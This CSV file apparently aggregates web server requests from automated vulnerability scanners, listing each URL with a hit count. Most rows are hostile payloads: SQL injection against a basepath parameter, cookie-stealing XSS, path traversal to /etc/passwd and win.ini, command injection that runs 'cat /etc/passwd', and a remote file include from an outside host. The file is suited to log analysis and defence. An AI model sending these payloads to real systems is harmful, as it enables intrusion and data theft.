Frequency,Resource
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
1,/main.php?basepath=%27%29%29%20AND%203819%3D2295%23
1,/add.php3?url=ja&adurl=javascript:<script>alert('Vulnerable')</script>
1,/news/news.mdb
1,/webamil/test.php
1,/forum/admin/database/wwForum.mdb
1,/main.php?basepath=-3291%27%29%20OR%205746%3D5746%23
1,MsmMask.exe
1,/webcart-lite/config/import.txt
1,/quikstore.cgi
1,/vendor/phpunit/phpunit/src/Util/Filter.php
1,/DomainFiles/*//../../../../../../../../../../etc/passwd
1,html2chtml.cgi
1,/cgi-bin/faqmanager.cgi?toc=/etc/passwd%00
1,/main.php?basepath=-4599%29%29%29%20ORDER%20BY%201%23
1,/bb-dnbd/faxsurvey
1,/main.php?basepath=-2550%27%29%20OR%203366%3D7287%23
1,/wp-includes/js/nri.exe
1,/freefpbf/
1,/TvLBvkHh.2
1,/TvLBvkHh.1
1,/docs/showtemp.cfm?TYPE=JPEG&FILE=c:\boot.ini
1,"/include.php?path=contact.php&contact_email=\"">&lt;script&gt;alert(document.cookie);&lt;/script&gt;"
1,/calendar.php?year=<script>alert(document.cookie);</script>&month=03&day=05
1,/TvLBvkHh.*
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
1,/forums//admin/config.php
1,/typo3conf/database.sql
2,cgiwrap/~ftp
1,/webtop/wdk/samples/dumpRequest.jsp?J=%3Cscript%3Ealert('Vulnerable');%3C/script%3Ef
1,/main.php?basepath=-8652%20OR%205746%3D5746%23
1,/%5BSecCheck%5D/../../ext.ini
1,/main.php?basepath=%25%27%29%20AND%207728%3D5732%23
1,/vgn/legacy/edit
1,/PSUser/PSCOErrPage.htm?errPagePath=/etc/passwd
1,/main.php?basepath=%20AND%208269%3D2909%23
1,/cgi-bin/rpm_query
1,/cgi-bin/snorkerz.cmd
1,commerce.cgi?page=../../../../../../../../../../etc/passwd%00index.html
1,/iisadmin/
1,/cgi-bin/listrec.pl
2,formmail.pl
1,/servlet/com.livesoftware.jrun.plugins.ssi.SSIFilter
1,/TvLBvkHh.shm
1,/main.php?basepath=-8502%22%20OR%205746%3D5746%23
1,/TvLBvkHh.c
1,/TvLBvkHh._
1,/global.asa
2,/dbadmin/index.php
1,/cgi-bin/shop.cgi?page=../../../../../../../etc/passwd
1,/nsn/..%5Cutil/slist.bas
1,/cgi-bin/uploader.exe
1,/cgi-bin/com5..........................................................................................................................................................................................................................box
1,/main.php?basepath=-2969%29%29%29%20UNION%20ALL%20SELECT%203228%2C3228%2C3228%2C3228%2C3228%2C3228%2C3228%2C3228%2C3228%2C3228%2C3228%2C3228%2C3228%2C3228%2C3228%2C3228%2C3228%2C3228%2C3228%2C3228%2C3228%2C3228%2C3228%2C3228%2C3228%2C3228%2C3228%2C3228%2C3228%2C3228%2C3228%2C3228%2C3228%2C3228%2C3228%2C3228%2C3228%2C3228%2C3228%2C3228%2C3228%23
1,/TvLBvkHh.PWD
1,/TvLBvkHh.stm
1,/cgi-bin/webspirs.cgi?sp.nextform=../../../../../../../../../../etc/passwd
1,/cgi-bin/generate.cgi?content=../../../../../../../../../../winnt/win.ini%00board=board_1
1,/cgi-bin/LWGate.cgi
1,/firmware/
1,test-env
1,/winbox.png
1,story/story.pl?next=../../../../../../../../../../etc/passwd%00
1,/IlohaMail/blank.html
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
1,start.cgi/%3Cscript%3Ealert('Vulnerable');%3C/script%3E
1,/cgi-bin/whois_raw.cgi?fqdn=%0Acat%20/etc/passwd
1,/cfdocs/expeval/displayopenedfile.cfm
1,/..%5C..%5C..%5C..%5C..%5C..%5Ctemp%5Ctemp.class
1,/TvLBvkHh.dll
1,/vgn/jsp/metadataupdate
1,/cgi-bin/webfind.exe?keywords=01234567890123456789
5,/phpmyadmin/scripts/_setup.php
1,/cgi-bin/test-cgi.tcl
1,/msadc/samples/adctest.asp
1,SQLServ/sqlbrowse.asp?filepath=c:\&Opt=3
1,/TvLBvkHh.cfg
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
1,/TvLBvkHh.cfc
1,/TvLBvkHh.cfm
1,/forums/index.php?top_message=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
1,hsx.cgi?show=../../../../../../../../../../../etc/passwd%00
1,/vgn/jsp/style
1,/cgi-bin/cart32.exe
1,/main.php?basepath=-6383%29%29%29%20UNION%20ALL%20SELECT%209451%2C9451%2C9451%2C9451%2C9451%2C9451%2C9451%2C9451%2C9451%2C9451%2C9451%2C9451%2C9451%2C9451%2C9451%2C9451%2C9451%2C9451%2C9451%2C9451%2C9451%2C9451%2C9451%2C9451%2C9451%2C9451%2C9451%2C9451%2C9451%2C9451%2C9451%2C9451%2C9451%2C9451%2C9451%2C9451%2C9451%2C9451%2C9451%2C9451%2C9451%2C9451%2C9451%2C9451%2C9451%2C9451%2C9451%2C9451%23
1,cgiwrap
1,/modules.php?op=modload&name=Xforum&file=member&action=viewpro&member=<script>alert('Vulnerable')</script>
1,main.cgi?board=FREE_BOARD&command=down_load&filename=../../../../../../../../../../etc/passwd
1,/../../../../../windows/win.ini
1,/cgi-bin/../abyss.conf
1,/main.php?basepath=%25%22%20AND%201916%3D1916%23
1,/main.php?basepath=%27%29%20OR%20NOT%207358%3D1393%23
1,/profile.php?u=fL2ak4pL
1,generate.cgi?content=../../../../../../../../../../etc/passwd%00board=board_1
1,////./../.../boot.ini
1,/exchange/lib/AMPROPS.INC
1,/events4.nsf
1,bizdb1-search.cgi
2,/myadmin/scripts/setup.php
1,/cgi-bin/ttawebtop.cgi/?action=start&pg=../../../../../../../../../../etc/passwd
1,/cgi-local/cgiemail-1.4/cgicso?query=<script>alert('Vulnerable')</script>
1,/cgi-bin/plusmail
1,/modules.php?name=Stories_Archive&sa=show_month&year=<script>alert('Vulnerable')</script>&month=3&month_l=test
1,/phpwebfilemgr/index.php?f=../../../../../../../../../etc/passwd
1,/cgi-bin/db4web_c/dbdirNikto//etc/passwd
1,/cgi-bin/htsearch.cgi?words=%22%3E%3Cscript%3Ealert%'Vulnerable'%29%3B%3C%2Fscript%3E
1,/index.html
1,/scripts/samples/search/queryhit.idq
1,ans/ans.pl?p=../../../../../usr/bin/id|&blah
1,search.php?searchstring=<script>alert(document.cookie)</script>
1,/test.shtml?%3CSCRIPT%3Ealert('Vulnerable')%3C%2FSCRIPT%3E=x
4,/setup.php
2,cgiwrap/~sys
2,/path/nw/article.php?id='
1,/splashAdmin.php
1,/servlet/webacc?User.html=noexist
1,/TvLBvkHh.printer
1,/main.php?basepath=%29%29%29%20OR%20EXTRACTVALUE%283235%2CCONCAT%280x5c%2C0x716a6b7671%2C%28SELECT%20%28ELT%283235%3D3235%2C1%29%29%29%2C0x71627a6a71%29%29%20AND%20%28%28%283275%3D3275
1,/main.php?basepath=%29%29%29%20OR%20%28SELECT%201220%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x716a6b7671%2C%28SELECT%20%28ELT%281220%3D1220%2C1%29%29%29%2C0x71627a6a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%28%28%286779%3D6779
1,/TvLBvkHh.list
1,/cgi-bin/search.pl?form=../../../../../../../../../../etc/passwd%00
1,/TvLBvkHh.nsf
1,/main.php?basepath=-1286%22%20OR%205746%3D5746%23
1,/webtop/wdk/samples/index.jsp
1,/cgi-bin/traffic.cgi?cfg=../../../../../../../../etc/passwd
1,/uploadx.asp
1,/SilverStream/Meta/Tables/?access-mode=text
1,/exchange/lib/JSROOT.INC
1,sewse?/home/httpd/html/sewse/jabber/comment2.jse+/etc/passwd
1,/main.php?basepath=-2839%27%29%29%20OR%209307%3D2862%23
1,/ammerum/
1,common/listrec.pl
1,/TvLBvkHh.htaccess
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
1,/main.php?basepath=%60%20WHERE%207839%3D7839%20AND%201916%3D1916%23
1,/TvLBvkHh.php
2,/hndUnblock.cgi
1,orders/orders.txt
1,/names.nsf
1,/scripts/iisadmin/ism.dll
3,/cgi-bin/cgiwrap/~root
1,/TvLBvkHh.log
1,/phpBB2/search.php?search_id=1\\
1,shopper.cgi?newpage=../../../../../../../../../../etc/passwd
1,/main.php?basepath=-5330%20OR%205872%3D9793%23
1,/quikstore.cfg
1,/main.php?basepath=%25%22%29%29%29%20AND%201916%3D1916%23
1,/somethingnotthere.ida
1,/cplogfile.log
1,/index.cgi
2,/admin/mysql2/index.php
1,/index.php/content/advancedsearch/?SearchText=<script>alert(document.cookie)</script>&PhraseSearchText=<script>alert(document.cookie)</script>&SearchContentClassID=-1&SearchSectionID=-1&SearchDate=-1&SearchButton=Search
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
1,/whatever.htr
1,/examples/jsp/snp/anything.snp
1,/cgis/
1,/myhome.php?action=messages&box=<script>alert('Vulnerable')</script>
1,/index.php?download=/etc/passwd
2,/upload/bank-icons/bank_16.png
1,/cgi-bin/processit.pl
1,gm-cplog.cgi
1,faxsurvey?cat%20/etc/passwd
1,/cgi-win/cgitest.exe
1,/phone/
1,/TvLBvkHh.sh
1,/_vti_bin/shtml.exe
1,/main.php?basepath=-2415%29%29%29%20UNION%20ALL%20SELECT%209220%2C9220%2C9220%2CCONCAT%280x716a6b7671%2C0x65714269514f79474950%2C0x71627a6a71%29%2C9220%23
2,/cgi-bin/cgiwrap/~listen
1,/TvLBvkHh.se
1,/cfdocs/snippets/gettempdirectory.cfm
1,/TvLBvkHh.save
1,/cgi-bin/csNewsPro.cgi?command=savesetup&setup=;system('cat%20/etc/passwd')
5,/php-my-admin/scripts/setup.php
1,vq/demos/respond.pl?<script>alert('Vulnerable')</script>
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
1,betsie/parserl.pl/%3Cscript%3Ealert('Vulnerable')%3C/script%3E;
1,/852566C90012664F
1,/cgi-bin/admin.cgi?list=../../../../../../../../../../etc/passwd
1,/main.php?basepath=-6000%29%29%29%20UNION%20ALL%20SELECT%202997%2C2997%2C2997%2C2997%2C2997%2C2997%2C2997%2C2997%2C2997%2C2997%2C2997%2C2997%2C2997%2C2997%2C2997%2C2997%2C2997%2C2997%2C2997%2C2997%2C2997%2C2997%2C2997%2C2997%2C2997%2C2997%2C2997%2C2997%2C2997%2C2997%2C2997%2C2997%2C2997%23
1,/PlcmSpIp/
1,/cgi-bin/mgrqcgi
1,/vgn/vr/Editing
1,/k/home?dir=/&file=../../../../../../../../etc/passwd&lang=kor
1,/pbserver/pbserver.dll
1,/main.php?basepath=%27%20AND%202993%3D3311%23
1,test2.pl?&lt;script&gt;alert('Vulnerable');&lt;/script&gt;
1,/TiVoConnect?Command=QueryServer
1,/phpMyAdmin/db_details_importdocsql.php?submit_show=true&do=import&docpath=../
1,"/administrator/gallery/gallery.php?directory=\""<script>alert(document.cookie)</script>"
1,/cersvr.nsf
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
1,wrap.cgi
1,/cgi-bin/webdist.cgi
1,/cgi-bin/mailnews.cgi
1,/scripts/proxy/w3proxy.dll
1,/prov/
1,/statrep.nsf
1,/query.idq?CiTemplate=../../../../../../../../../../winnt/win.ini
1,/filemanager/filemanager_forms.php?lib_path=http://cirt.net/rfiinc.txt?
1,/TvLBvkHh.box
1,/SilverStream
1,/main.php?basepath=-7117%29%29%29%20UNION%20ALL%20SELECT%20CONCAT%280x716a6b7671%2C0x4b595a4d634c4f6e7674%2C0x71627a6a71%29%2C1096%2C1096%2C1096%2C1096%23
1,/moo
1,/admin/browse.asp?FilePath=c:\&Opt=2&level=0
1,/main.php?basepath=%22%29%29%20AND%201916%3D1916%23
1,/perl/-e%20print%20Hello
1,/phorum/admin/header.php?GLOBALS[message]=<script>alert('Vulnerable')</script>
1,/cgi-bin/date
1,/cgibin/
1,/main.php?basepath=-5878%25%27%29%20OR%201053%3D5866%23
1,/TvLBvkHh.Big5
1,/tree
5,/scripts/setup.php
1,/clientaccesspolicy.xml
1,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%208064%2C8064%2C8064%2C8064%2CCONCAT%280x716a6b7671%2C0x504b6159757968576f5a%2C0x71627a6a71%29%23
1,/cgi-bin/AT-admin.cgi
1,/TvLBvkHh.pt
1,/TvLBvkHh.access
1,bb-hostsvc.sh?HOSTSVC=../../../../../../../../../../etc/passwd
2,/mysql/index.php
1,/TvLBvkHh.inc+
1,formmail
1,/launch.asp?NFuse_Application=<script>alert('Vulnerable')</script>
1,/cgi-bin/icat
1,lwgate
1,/cgi-bin/dansguardian.pl?DENIEDURL=</a><script>alert('Vulnerable');</script>
1,/cgi-exe/
1,/main.php?basepath=%29%29%29%20AND%209492%3D8791%23
1,sbcgi/sitebuilder.cgi
1,/main.php?basepath=-6361%29%29%29%20OR%201%20GROUP%20BY%20CONCAT%280x716a6b7671%2C%28SELECT%20%28CASE%20WHEN%20%281986%3D1986%29%20THEN%201%20ELSE%200%20END%29%29%2C0x71627a6a71%2CFLOOR%28RAND%280%29%2A2%29%29%20HAVING%20MIN%280%29%23
1,/cgi-bin/com5.java
1,/main.php?basepath=-3781%29%29%29%20UNION%20ALL%20SELECT%209030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%2C9030%23
1,generate.cgi?content=../../../../../../../../../../windows/win.ini%00board=board_1
1,/main.php?basepath=-5518%27%29%29%29%20OR%202217%3D8994%23
1,/aastra/
1,gm-authors.cgi
1,/TvLBvkHh.cwr
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
1,/ezhttpbench.php?AnalyseSite=/etc/passwd&NumLoops=1
5,/phpMyAdmin/scripts/_setup.php
1,classifieds/index.cgi
1,/TvLBvkHh.nsfdeslo
1,/images
2,/download.php?op=viewdownload
1,/pccsmysqladm/incs/dbconnect.inc
1,/examples/basic/servlet/HelloServlet
1,/cgi-bin/cgiwrap/%3Cfont%20color=red%3E
1,/examples/servlet/TroubleShooter
1,/prd.i/pgen/
1,/main.php?basepath=%29%29%29%20AND%204913%3D1381%23
1,/main.php?basepath=%29%29%29%20OR%203434%3DBENCHMARK%285000000%2CMD5%280x70796f47%29%29%23
1,/cgi-bin/cgicso?query=<script>alert('Vulnerable')</script>
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
1,/phpmyadmin/phpmyadmin/index.php
1,/uySJie59sZ
1,/main.php?basepath=-5687%29%29%29%20UNION%20ALL%20SELECT%203318%2C3318%2C3318%2C3318%2C3318%2C3318%2C3318%2C3318%2C3318%2C3318%2C3318%2C3318%2C3318%2C3318%2C3318%2C3318%2C3318%2C3318%2C3318%2C3318%2C3318%2C3318%2C3318%2C3318%2C3318%2C3318%2C3318%2C3318%2C3318%2C3318%2C3318%2C3318%2C3318%2C3318%2C3318%2C3318%2C3318%2C3318%2C3318%2C3318%2C3318%2C3318%2C3318%2C3318%2C3318%2C3318%2C3318%2C3318%2C3318%23
1,"/downloads/pafiledb.php?action=email&id=4?\""&lt;script&gt;alert('Vulnerable')&lt;/script&gt;\"""
1,/test.php%20
1,webdist.cgi?distloc=;cat%20/etc/passwd
2,cgiwrap/~bin
2,cgiwrap/~listen
1,/cgi-bin/cachemgr.cgi
1,/cgi-bin/ans/ans.pl?p=../../../../../usr/bin/id|&blah
1,/default.aspx
1,"/ca000007.pl?ACTION=SHOWCART&REFPAGE=\""><script>alert('Vulnerable')</script>"
1,/cbms/cbmsfoot.php
1,/index.cfm
1,/nsn/..%5Cutil/copy.bas
1,htsearch.cgi?words=%22%3E%3Cscript%3Ealert%'Vulnerable'%29%3B%3C%2Fscript%3E
1,/main.php?basepath=-1252%29%29%29%20UNION%20ALL%20SELECT%202557%2C2557%2C2557%2C2557%2C2557%2C2557%2C2557%2C2557%2C2557%2C2557%2C2557%2C2557%2C2557%2C2557%2C2557%2C2557%2C2557%2C2557%2C2557%2C2557%2C2557%2C2557%2C2557%2C2557%2C2557%2C2557%2C2557%2C2557%2C2557%2C2557%2C2557%2C2557%2C2557%2C2557%2C2557%2C2557%2C2557%2C2557%2C2557%2C2557%2C2557%2C2557%2C2557%2C2557%2C2557%2C2557%2C2557%2C2557%2C2557%2C2557%2C2557%2C2557%2C2557%2C2557%2C2557%2C2557%2C2557%2C2557%2C2557%2C2557%2C2557%2C2557%2C2557%2C2557%2C2557%2C2557%2C2557%2C2557%2C2557%2C2557%2C2557%2C2557%2C2557%2C2557%2C2557%2C2557%2C2557%2C2557%2C2557%23
1,/main.php?basepath=%25%22%29%29%20AND%201916%3D1916%23
1,/main.php?basepath=%22%20AND%205628%3D5646%23
1,/cgi-bin/fom.cgi?file=<script>alert('Vulnerable')</script>
1,/ht_root/wwwroot/-/local/httpd$map.conf
1,/main.php?basepath=-5462%29%29%29%20UNION%20ALL%20SELECT%202733%2C2733%2CCONCAT%280x716a6b7671%2C0x647651425a6d417a6b52%2C0x71627a6a71%29%2C2733%2C2733%23
1,.cobalt/alert/service.cgi?service=<script>alert('Vulnerable')</script>
1,/main.php?basepath=-6519%29%29%29%20UNION%20ALL%20SELECT%208897%2C8897%2C8897%2C8897%2C8897%2C8897%2C8897%2C8897%2C8897%2C8897%2C8897%2C8897%2C8897%2C8897%2C8897%2C8897%2C8897%2C8897%2C8897%2C8897%2C8897%2C8897%2C8897%2C8897%2C8897%2C8897%2C8897%2C8897%2C8897%2C8897%2C8897%2C8897%2C8897%2C8897%2C8897%2C8897%2C8897%2C8897%2C8897%2C8897%2C8897%2C8897%2C8897%2C8897%2C8897%2C8897%2C8897%2C8897%2C8897%2C8897%2C8897%2C8897%2C8897%2C8897%2C8897%2C8897%2C8897%2C8897%2C8897%2C8897%2C8897%23
1,/cgi-bin/campas?%0acat%0a/etc/passwd%0a
1,calendar/calendar_admin.pl?config=|cat%20/etc/passwd|
1,/nsn/..%5Cutil/dir.bas
1,/cgi-bin/main.cgi?board=FREE_BOARD&command=down_load&filename=../../../../../../../../../../etc/passwd
1,/unauthenticated/provisioning/
1,/main.php?basepath=%27%20OR%20NOT%204288%3D4288%23
1,/wa.exe
1,/main.php?basepath=-2053%27%29%29%29%20OR%205746%3D5746%23
1,sendtemp.pl?templ=../../../../../../../../../../etc/passwd
1,/cgi-bin/way-board/way-board.cgi?db=/etc/passwd%00
1,/help.html
1,/index.php/content/search/?SectionID=3&SearchText=<script>alert(document.cookie)</script>
1,/main.php?basepath=%29%20AND%201916%3D1916%23
1,/modules.php?op=modload&name=News&file=article&sid=<script>alert('Vulnerable');</script+>
